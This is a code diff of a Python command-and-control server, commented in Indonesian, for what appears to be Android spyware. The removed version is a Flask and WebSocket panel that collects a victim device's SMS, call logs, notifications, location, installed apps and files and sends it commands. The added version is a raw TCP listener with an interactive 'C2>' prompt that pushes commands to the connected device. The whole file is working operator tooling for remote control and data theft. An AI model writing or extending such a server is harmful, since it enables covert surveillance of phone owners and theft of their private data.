@@ -1,231 +1,136 @@
-import os
+import socket
 import json
-import base64
 import threading
-import time
+import base64
 from datetime import datetime
-from flask import Flask, request, jsonify, send_from_directory
-from flask_sock import Sock
-
-# --- Konfigurasi Aplikasi ---
-app = Flask(__name__, static_folder='static', static_url_path='')
-sock = Sock(app)
-
-# Menonaktifkan logging standar Flask untuk tampilan yang bersih
+import time
 import logging
-log = logging.getLogger('werkzeug')
-log.setLevel(logging.ERROR)
+import sys
+import os
+from colorama import init, Fore, Style
+import signal
 
-# --- Penyimpanan Status Global (State Management) ---
-class C2State:
-    def __init__(self):
-        self.device_socket = None
-        self.device_info = {}
-        self.notifications = []
-        self.sms_list = []
-        self.call_logs = []
-        self.app_list = []
-        self.location = None
-        self.file_manager = {'path': '/', 'files': []}
-        self.command_history = []
-        self.lock = threading.Lock()
+# --- Globals ---
+client_socket = None
+client_address = None
+running = True
+# Kita tidak lagi butuh state web seperti in_shell_mode, dll di level global
+# karena tidak ada web interface
 
-    def set_socket(self, ws):
-        with self.lock:
-            self.device_socket = ws
+# --- Setup ---
+init(autoreset=True)
+if not os.path.exists('device_downloads'): os.makedirs('device_downloads')
+if not os.path.exists('captured_images'): os.makedirs('captured_images')
 
-    def clear_socket(self):
-        with self.lock:
-            self.device_socket = None
-            self.device_info = {} # Reset info saat disconnect
+def print_header():
+    print(Fore.CYAN + "=" * 80)
+    print(Fore.CYAN + "      REMOTE C2 AGENT - PURE TCP PROXY ARCHITECTURE")
+    print(Fore.CYAN + "=" * 80)
 
-    def is_connected(self):
-        return self.device_socket is not None
-
-    def add_notification(self, data):
-        with self.lock:
-            notif = {
-                'title': data.get('title', 'N/A'),
-                'text': data.get('text', 'N/A'),
-                'package': data.get('packageName', 'N/A'),
-                'time': datetime.now().strftime('%H:%M:%S')
-            }
-            self.notifications.insert(0, notif)
-            self.notifications = self.notifications[:100] # Batasi 100 notifikasi
-
-    def add_command_history(self, command, response="Sent"):
-        with self.lock:
-            entry = {
-                "command": command,
-                "response": response,
-                "time": datetime.now().strftime('%H:%M:%S')
-            }
-            self.command_history.insert(0, entry)
-            self.command_history = self.command_history[:50]
-    
-    def send_command(self, command, params={}):
-        if not self.is_connected():
-            return False, "Device not connected"
-        
-        try:
-            payload = json.dumps({"command": command, "params": params})
-            self.device_socket.send(payload)
-            self.add_command_history(f"{command} {json.dumps(params)}")
-            return True, "Command sent"
-        except Exception as e:
-            print(f"[ERROR] Failed to send command: {e}")
-            self.clear_socket()
-            return False, str(e)
-
-c2_state = C2State()
-
-# --- Direktori untuk File yang Diunduh ---
-DOWNLOADS_DIR = 'device_downloads'
-if not os.path.exists(DOWNLOADS_DIR):
-    os.makedirs(DOWNLOADS_DIR)
-
-# --- Handler untuk Koneksi WebSocket dari Perangkat ---
-@sock.route('/c2')
-def c2_socket_handler(ws):
-    if c2_state.is_connected():
-        print("[INFO] Rejecting new device connection, one is already active.")
-        ws.close()
-        return
-
-    print("[SUCCESS] Device connected via WebSocket.")
-    c2_state.set_socket(ws)
-
+def handle_incoming_data(data):
+    """Fungsi sederhana untuk mencetak semua data yang masuk dari perangkat."""
     try:
-        while True:
-            data = ws.receive()
-            if data is None:
-                break
-            process_device_data(data)
+        # Hanya print data mentah ke terminal agar kita tahu koneksi berhasil
+        print(f"\n{Fore.GREEN}[RECV]: {data[:300]}")
     except Exception as e:
-        print(f"[ERROR] WebSocket connection error: {e}")
+        print(f"\n{Fore.RED}[ERROR] Could not process data: {e}")
+
+# --- Handler Koneksi TCP ---
+def handle_connection(conn, addr):
+    global client_socket, client_address
+    buffer = ""
+    try:
+        client_socket, client_address = conn, addr
+        print(f"\n{Fore.GREEN}[+] Accepted TCP connection from {addr[0]}:{addr[1]}")
+
+        while running:
+            data = conn.recv(16384).decode('utf-8', errors='ignore')
+            if not data: break
+            buffer += data
+            while '\n' in buffer:
+                line, buffer = buffer.split('\n', 1)
+                if line.strip():
+                    handle_incoming_data(line.strip())
+    except (ConnectionResetError, BrokenPipeError, socket.timeout):
+        print(f"\n{Fore.RED}Client connection lost.")
     finally:
-        print("[INFO] Device disconnected.")
-        c2_state.clear_socket()
+        print(f"\n{Fore.RED}TCP client disconnected.")
+        client_socket = None
+        client_address = None
+        conn.close()
 
-def process_device_data(data):
-    """Memproses semua data JSON yang masuk dari perangkat"""
+def start_server(host, port):
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     try:
-        payload = json.loads(data).get('data', {})
-        log_type = payload.get('type', 'UNKNOWN')
+        server_socket.bind((host, port))
+    except Exception as e:
+        print(f"{Fore.RED}[ERROR] Could not bind to port {port}: {e}")
+        os._exit(1)
 
-        with c2_state.lock:
-            if log_type == 'DEVICE_INFO':
-                c2_state.device_info = payload.get('info', {})
-            elif log_type == 'NOTIFICATION_DATA':
-                c2_state.add_notification(payload.get('notification', {}))
-            elif log_type == 'SMS_LOG':
-                c2_state.sms_list = payload.get('logs', [])
-            elif log_type == 'CALL_LOG':
-                c2_state.call_logs = payload.get('logs', [])
-            elif log_type == 'APP_LIST':
-                c2_state.app_list = payload.get('apps', [])
-            elif log_type == 'LOCATION_SUCCESS':
-                c2_state.location = {'url': payload.get('url'), 'time': datetime.now().strftime('%H:%M:%S')}
-            elif log_type == 'LOCATION_FAIL':
-                c2_state.location = {'error': payload.get('error'), 'time': datetime.now().strftime('%H:%M:%S')}
-            elif log_type == 'FILE_MANAGER_RESULT':
-                c2_state.file_manager['path'] = payload.get('current_path', '/')
-                c2_state.file_manager['files'] = payload.get('files', [])
-            elif log_type == 'IMAGE_DATA' or log_type.endswith('_CHUNK'):
-                save_file_from_device(payload, log_type)
+    server_socket.listen(1)
+    # Port internal adalah 9090, tapi akan diekspos oleh Railway via TCP Proxy
+    print(f"[*] Pure TCP server listening on {host}:{port}")
+
+    while running:
+        try:
+            conn, addr = server_socket.accept()
+            if client_socket is not None:
+                print(f"\n{Fore.YELLOW}[-] Rejecting new connection. A client is already connected.")
+                conn.close()
+                continue
+            
+            thread = threading.Thread(target=handle_connection, args=(conn, addr), daemon=True)
+            thread.start()
+        except OSError:
+            break
+        except Exception as e:
+            if running: print(f"{Fore.RED}[ERROR] Server on port {port} crashed: {e}")
+            break
+    server_socket.close()
+
+# --- Shell untuk mengirim perintah ---
+def command_shell():
+    global running
+    time.sleep(2) # Beri waktu server untuk start
+    while running:
+        try:
+            cmd_input = input(f"{Fore.CYAN}C2> {Style.RESET_ALL}")
+            if not cmd_input: continue
+            if cmd_input.lower() in ['quit', 'exit']:
+                running = False
+                break
+            
+            if client_socket:
+                try:
+                    # Kirim perintah mentah, biarkan klien yang memproses
+                    client_socket.sendall(f"{cmd_input}\n".encode('utf-8'))
+                except (BrokenPipeError, ConnectionResetError):
+                    print(Fore.RED + "Failed to send: Client disconnected.")
+                    client_socket = None
             else:
-                # Untuk tipe lain, simpan sebagai response di histori
-                c2_state.add_command_history(log_type, json.dumps(payload))
+                print(Fore.YELLOW + "No client connected.")
+        except (EOFError, KeyboardInterrupt):
+            running = False
+            break
+            
+if __name__ == '__main__':
+    def signal_handler(sig, frame):
+        global running
+        running = False
+        print("\nExiting...")
+        if client_socket:
+            client_socket.close()
+        # Force exit
+        threading.Timer(1.5, os._exit, [0]).start()
 
-    except json.JSONDecodeError:
-        print(f"[WARN] Received non-JSON data: {data[:100]}")
-    except Exception as e:
-        print(f"[ERROR] Failed to process device data: {e}")
+    signal.signal(signal.SIGINT, signal_handler)
+    print_header()
 
-def save_file_from_device(payload, log_type):
-    """Menyimpan file yang di-chunk dari perangkat"""
-    try:
-        if log_type == 'IMAGE_DATA':
-            chunk_data = payload.get('image')
-        else: # GET_FILE_CHUNK, etc
-            chunk_data = payload.get('chunk_data')
+    # Jalankan server TCP di port 9090
+    server_thread = threading.Thread(target=start_server, args=('0.0.0.0', 9090), daemon=True)
+    server_thread.start()
 
-        filename = chunk_data.get('filename', 'downloaded_file')
-        filepath = os.path.join(DOWNLOADS_DIR, filename)
-        
-        mode = 'wb' if chunk_data.get('is_first_chunk', False) else 'ab'
-        
-        with open(filepath, mode) as f:
-            f.write(base64.b64decode(chunk_data.get('chunk', '')))
-
-        if chunk_data.get('is_last_chunk', False):
-            print(f"[SUCCESS] File saved: {filepath}")
-            c2_state.add_command_history(f"Download {filename}", f"Saved to server.")
-
-    except Exception as e:
-        print(f"[ERROR] Could not save file chunk: {e}")
-
-# --- API Endpoints untuk Frontend Web ---
-@app.route('/')
-def index():
-    return send_from_directory('.', 'index.html')
-
-@app.route('/api/status')
-def get_status():
-    with c2_state.lock:
-        return jsonify({
-            'connected': c2_state.is_connected(),
-            'device_info': c2_state.device_info,
-        })
-
-@app.route('/api/data/<data_type>')
-def get_data(data_type):
-    with c2_state.lock:
-        data_map = {
-            'notifications': c2_state.notifications,
-            'sms': c2_state.sms_list,
-            'calllogs': c2_state.call_logs,
-            'apps': c2_state.app_list,
-            'location': c2_state.location,
-            'filemanager': c2_state.file_manager,
-            'history': c2_state.command_history,
-        }
-    data = data_map.get(data_type, {'error': 'Invalid data type'})
-    return jsonify(data)
-
-@app.route('/api/command', methods=['POST'])
-def handle_command():
-    data = request.json
-    command = data.get('command')
-    params = data.get('params', {})
-
-    if not command:
-        return jsonify({'status': 'error', 'message': 'Command not provided'}), 400
-
-    # Perintah khusus yang ditangani server
-    if command == "clear_data":
-        data_type = params.get("type")
-        with c2_state.lock:
-            if data_type == "notifications": c2_state.notifications.clear()
-            elif data_type == "history": c2_state.command_history.clear()
-        return jsonify({'status': 'ok', 'message': f'{data_type} cleared'})
-
-    # Kirim perintah ke perangkat
-    success, message = c2_state.send_command(command, params)
-
-    if success:
-        return jsonify({'status': 'ok', 'message': message})
-    else:
-        return jsonify({'status': 'error', 'message': message}), 500
-
-
-if __name__ == "__main__":
-    print("="*50)
-    print("      C2 WEB SERVER (FLASK EDITION)")
-    print("  Jangan jalankan ini langsung untuk deployment.")
-    print("  Gunakan 'gunicorn' seperti di panduan Railway.")
-    print("="*50)
-    # Jalankan server untuk testing lokal
-    # Di produksi, Railway akan menggunakan Gunicorn
-    app.run(host='0.0.0.0', port=5000, debug=False)
-
+    # Jalankan shell perintah di thread utama
+    command_shell()
+    os._exit(0)
